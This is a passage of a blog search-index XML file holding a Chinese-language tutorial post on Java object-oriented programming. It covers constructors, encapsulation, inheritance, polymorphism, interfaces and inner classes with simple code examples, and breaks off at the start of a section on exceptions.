<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java面向对象(Part-5)</title>
      <link href="/2022/03/08/java-mian-xiang-dui-xiang/"/>
      <url>/2022/03/08/java-mian-xiang-dui-xiang/</url>
      
        <content type="html"><![CDATA[<h1 id="Java面向对象"><a href="#Java面向对象" class="headerlink" title="Java面向对象"></a>Java面向对象</h1><h2 id="1、什么是面向对象"><a href="#1、什么是面向对象" class="headerlink" title="1、什么是面向对象"></a>1、什么是面向对象</h2><ul><li><p>面向<strong>过程</strong>思想</p><ul><li>步骤清晰，第一步做什么，第二步做什么……</li></ul></li><li><p>面向<strong>对象</strong>思想：</p><ul><li><strong>分类</strong>的思维模式，思考解决问题需要哪些分类，对分类进行单独思考，最后对某个分类下的细节进行面向过程思索。</li></ul></li><li><p>对于描述复杂的事物，为了从<strong>宏观</strong>把握，<strong>整体</strong>分析，需要使用<strong>面向对象</strong>的思路；</p><p>具体到微观操作，仍需<strong>面向过程</strong>思路处理。</p></li><li><p>面向对象编程的本质：<strong>以类的方式组织代码，以对象的形式组织（封装）数据。</strong></p></li><li><p>三大特性</p><ul><li>封装</li><li>继承</li><li>多态</li></ul></li></ul><h2 id="2、类与对象的关系"><a href="#2、类与对象的关系" class="headerlink" title="2、类与对象的关系"></a>2、类与对象的关系</h2><ol><li>类是一种<strong>抽象</strong>的数据类型，对某一类事物整体描述，不能代表某一具体事物。<ul><li>静态的属性-<strong>属性</strong></li><li>动态的行为-<strong>方法</strong></li></ul></li><li>对象是抽象概念的<strong>具体实例</strong>，<strong>类是对象的模板</strong>。</li></ol><h3 id="（1）使用new关键字创建对象："><a href="#（1）使用new关键字创建对象：" class="headerlink" title="（1）使用new关键字创建对象："></a><strong>（1）使用<code>new</code>关键字创建对象</strong>：</h3><ul><li>分配内存空间。</li><li>给创建好的对象默认初始化。</li><li>对类中构造器调用。</li></ul><h3 id="（2）构造器"><a href="#（2）构造器" class="headerlink" title="（2）构造器"></a><strong>（2）构造器</strong></h3><p>类中构造器也称构造方法，是在进行<strong>创建对象时</strong>候必须要调用的。特点：</p><ul><li>必须和<strong>类</strong>的<strong>名字相同</strong></li><li>必须<strong>没有返回类型</strong>，也不能写 void</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Student类</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//一个类什么都不写，也会存在一个方法；</span>    <span class="token comment">//显示的定义构造器</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>        <span class="token comment">//1、使用new关键字，本身是在调用构造器</span>  <span class="token comment">//2、用来初始化值</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"xiaohong"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//有参构造：一旦定义有参构造（若还使用无参构造new 对象），无参必须显示定义</span>    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span><span class="token comment">//this.name当前类中的name</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*测试------------------------------------------public class Demo06 &#123;    public static void main(String[] args) &#123;        //类实例化后返回一个自己的对象        Student student = new Student("xiaoming");        System.out.println(student.name);    &#125;&#125;//结果：xiaoming*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（3）对象的创建和使用"><a href="#（3）对象的创建和使用" class="headerlink" title="（3）对象的创建和使用"></a>（3）对象的创建和使用</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*必须使用new关键字创造对象；对象的属性：student.name对象的方法：student.sleep()*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、封装"><a href="#3、封装" class="headerlink" title="3、封装"></a>3、封装</h2><p><strong>高聚合：类的内部数据操作细节自己完成，不允许外部干涉</strong></p><p><strong>低耦合：仅限少量的方法给外部使用</strong></p><p>封装：通常，应禁止直接访问一个对象中数据的实际表示，而应通过<strong>操作接口</strong>来访问。</p><p><strong>属性私有，get/set</strong></p><p><strong>封装意义：</strong></p><ul><li>提高程序的安全性，保护数据</li><li>隐藏代码的实现细节</li><li>统一接口</li><li>系统可持续性增加</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//属性私有</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">char</span> sex<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token comment">//提供一些可操作这些属性的方法！</span>    <span class="token comment">//提供一些public的get、set方法</span>    <span class="token comment">//get获取这个数据</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>age<span class="token operator">></span><span class="token number">120</span><span class="token operator">||</span>age<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*测试-----------------------------------------public class Demo07 &#123;    public static void main(String[] args) &#123;        Student s1 = new Student();        s1.setName("小明");        s1.setAge(-1); //不合法        System.out.println(s1.getName());        System.out.println(s1.getAge());    &#125;&#125;//结果：小明3*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、继承"><a href="#4、继承" class="headerlink" title="4、继承"></a>4、继承</h2><p><strong>继承</strong>是<strong>类和类之间</strong>的关系，除此之外类和类之间还有<strong>依赖</strong>、<strong>组合</strong>、<strong>聚合</strong>等；</p><p>继承关系是两个类，一个是<strong>子类（派生类）</strong>，一个是<strong>父类（基类）</strong>。子类继承父类，使用<strong>extends</strong>来表示。</p><p>JAVA中类只有<strong>单继承</strong>，没有多继承！</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//子类继承父类，就会拥有父类全部方法！</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//Java中，所有的类都默认直接或间接继承Object类</span><span class="token comment">//父类中私有(private)属性不会继承</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（1）Super"><a href="#（1）Super" class="headerlink" title="（1）Super"></a><strong>（1）Super</strong></h3><ul><li><code>super</code>调用父类的构造方法，必须在<strong>构造方法的第一个</strong></li><li><code>super</code>必须只能出现在<strong>子类</strong>的方法或构造方法中！</li><li><code>super</code>和<code>this</code><strong>不能同时</strong>调用构造方法</li></ul><table><thead><tr><th>This</th><th>Super</th></tr></thead><tbody><tr><td>本身调用这个对象</td><td>代表父类对象的引用</td></tr><tr><td>没有继承也可以使用</td><td>只能在继承条件下才可以使用</td></tr><tr><td>默认调用本类的构造</td><td>调用父类的构造</td></tr></tbody></table><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Persion.java</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Persion</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"persion"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//--------------------------------------------</span><span class="token comment">//Student.java</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Persion</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token string">"student"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//student</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//结果persion;子类调用父类的属性super.name</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*测试----------------------------------------------------------------------------package com.jaa.method;import com.jaa.method.testclass.*;public class Demo08 &#123;    public static void main(String[] args) &#123;       Student s1 = new Student();       s1.test("xiaoming");    &#125;&#125;//结果xiaomingstudentpersion*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（2）重写方法"><a href="#（2）重写方法" class="headerlink" title="（2）重写方法"></a>（2）重写方法</h3><p>需要有继承关系，子类重写父类的<strong>方法！</strong></p><ul><li>方法名必须相同</li><li>参数列表必须相同</li><li>修饰符：范围可以扩大：<code>public &gt; protected &gt; default &gt; private</code></li><li>抛出的异常：范围可以被缩小，但不能扩大</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*补充：父类和子类方法名与参数列表相同时：1、静态方法：方法的调用只和左边，定义的数据类型有关2、非静态方法：子类重写父类方法，执行子类。（重写）*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、多态"><a href="#5、多态" class="headerlink" title="5、多态"></a>5、多态</h2><p>同一方法可以根据<strong>发送对象的不同</strong>而采用<strong>多种不同的行为方式</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Persion.java</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Persion</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"run"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//------------------------------------------</span><span class="token comment">//Student.java</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token keyword">extends</span> <span class="token class-name">Persion</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"son"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"eat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//--------------------------------------------</span><span class="token comment">//测试：</span>ublic <span class="token keyword">class</span> <span class="token class-name">Demo09</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//一个对象的实际类型是确定的</span>        <span class="token comment">//new Student()</span>        <span class="token comment">//new Persion()</span>        <span class="token comment">//可以指向的引用类型不确定:父类的引用指向子类的类型</span>        <span class="token class-name">Student</span> s1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Persion</span> s2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//对象能执行那些方法看对象左边的类型和右边关系不大！</span>        s1<span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// s2.eat(); 无法运行，父类中无此方法</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>多态注意事项：</strong></p><ul><li>多态是<strong>方法的多态</strong>，属性没有多态！</li><li>存在于父类和子类关系中；类型转换异常！<code>ClassCastException!</code></li><li>存在条件：继承关系，<strong>方法需要重写</strong>，<strong>父类的引用指向子类对象！</strong></li><li><strong>不能重写</strong>的方法：<ul><li><code>static</code> 方法，属于类，不属于实例</li><li><code>final </code>常量</li><li><code>private</code>方法</li></ul></li></ul><h3 id="（1）Instanceof"><a href="#（1）Instanceof" class="headerlink" title="（1）Instanceof"></a>（1）Instanceof</h3><p><strong>判断两个类之间是否存在父子关系</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x <span class="token keyword">instanceof</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//能否编译通过！判断是否存在父子关系</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>类型转换</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//父类Persion 子类Student</span><span class="token comment">//高//低</span><span class="token class-name">Persion</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//低转高 强制转换后可使用Student类型方法</span><span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Student</span><span class="token punctuation">)</span>obj<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（2）Static（和类一起加载）"><a href="#（2）Static（和类一起加载）" class="headerlink" title="（2）Static（和类一起加载）"></a>（2）Static（和类一起加载）</h3><p><strong>静态方法<code>static</code>：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//可通过类名.方法名直接调用；</span><span class="token class-name">Student</span><span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>非静态方法：</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//1、实例化类 new</span><span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Student类；say方法</span><span class="token comment">//2、实例话一个对象，对象名.方法名调用</span><span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>student<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>静态代码块</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//只执行一次，和类一起加载</span><span class="token keyword">static</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>匿名代码块</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//和对象同时产生，赋初始值</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="6、抽象类、接口"><a href="#6、抽象类、接口" class="headerlink" title="6、抽象类、接口"></a>6、抽象类、接口</h2><h3 id="（1）抽象类"><a href="#（1）抽象类" class="headerlink" title="（1）抽象类"></a>（1）抽象类</h3><ul><li>**<code>abstract</code>**修饰的类、方法为抽象类、抽象方法</li><li>继承了抽象类的子类都<strong>必须要实现他的方法</strong></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//抽象类</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> action <span class="token punctuation">&#123;</span>    <span class="token comment">//抽象方法，只有方法的名字，没有方法的实现</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">doSomthings</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//1、抽象类不能new，只能靠子类去实现！</span>    <span class="token comment">//2、抽象类中可以写普通方法</span>    <span class="token comment">//3、抽象方法必须在抽象类中</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="（2）接口"><a href="#（2）接口" class="headerlink" title="（2）接口"></a>（2）接口</h3><table><thead><tr><th>普通类</th><th>抽象类</th><th>接口</th></tr></thead><tbody><tr><td>只有具体实现</td><td>具体实现和规范（抽象方法）都有</td><td>只有规范！自己无法写方法</td></tr></tbody></table><ul><li>接口：只有规范！自己无法写方法～约束和实现分离：面向接口编程～</li><li>接口不能被实例化，接口中没有构造方法</li><li><strong>接口的本质是契约</strong></li><li>实现了接口的类，必须<strong>重写接口的所有的方法</strong></li><li><strong><code>implements</code>利用接口实现多继承</strong></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//interface定义关键字，接口都需要有实现类</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">UserService</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//接口中所有的定义的方法都是抽象的 public abstract</span>    <span class="token comment">//接口中定义的常量 public static final</span>    <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">sel</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">TimeService</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">timer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//类 可以实现接口 implements 接口</span><span class="token comment">//实现了接口的类，必须重写接口的所有的方法</span><span class="token comment">//利用接口实现多继承</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserService</span><span class="token punctuation">,</span><span class="token class-name">TimeService</span><span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sel</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">timer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7、内部类"><a href="#7、内部类" class="headerlink" title="7、内部类"></a>7、内部类</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Outer</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> id <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">out</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是外部类方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//内部类</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inner</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">in</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"这是内部类方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">//获得外部类的私有属性</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/*测试：public class Application &#123;    public static void main(String[] args) &#123;        Outer outer = new Outer();        //通过外部类实例化内部类        Outer.Inner inner = outer.new Inner();        inner.getID();    &#125;&#125;*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>匿名内部类</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token comment">//没有名字初始化类，不用将实例保存到变量中</span>        <span class="token keyword">new</span> <span class="token class-name">Apple</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Apple</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">eat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="8、异常"><a href="#8、异常" class="headerlink" title="8、异常"></a>8、异常</h2><h3 id="（1）什么事异常"><a href="#（1）什么事异常" class="headerlink" title="（1）什么事异常"></a>（1）什么事异常</h3><p><strong>检查性异常</strong></p><p><strong>运行时异常</strong></p><p><strong>错误ERROR</strong></p><p><strong>Java</strong>把异常当作对象来处理，并定义一个基类**<code>java.lang.Throwable</code><strong>作为所有异常的</strong>超类**</p><p><strong>Java 